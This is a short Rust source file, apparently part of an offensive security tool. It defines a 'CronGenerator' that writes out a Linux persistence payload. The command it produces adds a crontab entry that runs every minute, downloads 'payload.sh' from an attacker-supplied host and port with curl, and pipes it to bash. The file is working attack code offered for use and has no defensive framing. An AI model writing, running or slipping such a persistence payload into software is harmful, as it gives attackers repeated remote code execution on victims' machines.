// Linux Cron persistence payload generator
use crate::cli::banner;

pub struct CronGenerator;

impl CronGenerator {
    pub fn new() -> Self { Self }
    
    pub fn generate(&self, lhost: &str, lport: &str) -> String {
        banner::print_exploiting("CRON-PERSISTENCE", &format!("{}:{}", lhost, lport));
        
        format!(
            "(crontab -l 2>/dev/null; echo \"* * * * * curl -s http://{}:{}/payload.sh | bash\") | crontab -",
            lhost, lport
        )
    }
}
